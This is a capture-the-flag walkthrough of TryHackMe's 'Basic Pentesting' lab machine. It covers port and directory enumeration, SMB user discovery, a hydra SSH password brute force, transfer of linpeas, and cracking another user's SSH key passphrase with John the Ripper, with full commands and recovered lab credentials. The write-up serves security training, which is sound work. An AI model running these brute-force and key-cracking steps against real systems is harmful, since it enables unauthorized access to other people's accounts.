# Basic Pentesting

## Task 1

1.  	Deploy the machine and connect to our network
```
export IP=10.10.3.156
```

2. Find the services exposed by the machine
```
jeffrowell@kali:~/Documents/tryHackMe/basicPentesting$ nmap -sC -sV -Pn -n -oN nmap/initial.txt $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-14 20:51 MDT
Stats: 0:01:35 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 20:53 (0:00:35 remaining)
Stats: 0:02:50 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 20:55 (0:01:13 remaining)
Nmap scan report for 10.10.3.156
Host is up (0.14s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13?
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http-proxy
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

3.  What is the name of the hidden directory on the web server(enter name without /)?
```
jeffrowell@kali:~/Documents/tryHackMe/basicPentesting$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.3.156
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/14 20:54:39 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.hta (Status: 403)
/.htpasswd (Status: 403)
/development (Status: 301)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/05/14 20:55:49 Finished
```


4.  User brute-forcing to find the username & password
```
jeffrowell@kali:~/Documents/tryHackMe/basicPentesting$ enum4linux -a $IP | tee enum4linux.log
```
This found some SMB shares that we could pursue:
```
========================================
|    Share Enumeration on 10.10.3.156    |
========================================

 Sharename       Type      Comment
 ---------       ----      -------
 Anonymous       Disk      
 IPC$            IPC       IPC Service (Samba Server 4.3.11-Ubuntu)
 ```
`enum4linux` also finds two users on the box, `kay` and `jan`:
```
======================================================================
|    Users on 10.10.3.156 via RID cycling (RIDS: 500-550,1000-1050)    |
======================================================================
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
```

5. What is the username?      
The username was found using `enum4linux` in combinatoin with reading the hints found under the `/development` directory on the web page. The usename is `jan`


6. What is the password?
We can brute force the password using `hydra`:
```
jeffrowell@kali:~/Documents/tryHackMe/basicPentesting$ hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://$IP
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-14 21:30:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.3.156:22/
[STATUS] 178.00 tries/min, 178 tries in 00:01h, 14344223 to do in 1343:06h, 16 active
[STATUS] 123.67 tries/min, 371 tries in 00:03h, 14344030 to do in 1933:10h, 16 active
[22][ssh] host: 10.10.3.156   login: jan   password: armando
```

7.  What service do you use to access the server(answer in abbreviation in all caps)?
```
SSH
```


8.  Enumerate the machine to find any vectors for privilege escalation
We can now log in using the `jan:armando` credentials that we found. We can scp and run `linpeas` as follows:
```
jeffrowell@kali:~/Documents/tryHackMe/basicPentesting$ scp linpeas.sh jan@$IP:/tmp
jan@10.10.3.156's password:
linpeas.sh                                                                                                                                                 100%  219KB 107.9KB/s   00:02    
jeffrowell@kali:~/Documents/tryHackMe/basicPentesting$
```
Once `linpeas` is on the box, mark as executable and run:
```
jan@basic2:~$ chmod +x /tmp/linpeas.sh
jan@basic2:~$ /tmp/linpeas.sh
```
Looking through the output that `linpeas` returns us, we see that we can access the private key file of the `kay` user.
```
[+] Looking for ssl/ssh files
/home/kay/.ssh/authorized_keys
/home/kay/.ssh/id_rsa
/home/kay/.ssh/id_rsa.pub
Port 22
PermitRootLogin prohibit-password
PubkeyAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes
Possible private SSH keys were found!
/home/kay/.ssh/id_rsa
 --> /etc/hosts.allow file found, read the rules:
```
Copying the key to our local machine and we find that the private key is password protected, so we can use JtR's `ssh2john` to get a hash from the private key:
```
jeffrowell@kali:~/Documents/tryHackMe/basicPentesting$ /opt/JohnTheRipper/src/john kay_id_rsa --wordlist=/usr/share/wordlists/rockyou.txt
```
Now that we have a hash, we can load that hash into JtR like normal and get the password:
```
jeffrowell@kali:~/Documents/tryHackMe/basicPentesting$ sudo john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_id_rsa)
```


9.  What is the name of the other user you found(all lower case)?
From the SMB share enumeration earlier:
```
kay
```

10.  If you have found another user, what can you do with this information?
Brute force the password.

11.  What is the final password you obtain?
After using JtR the password to the private key is:
```
beeswax
```
Using this password we can now ssh to the box as `kay` and in the home directory is our file containing the final password:
```
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$
```
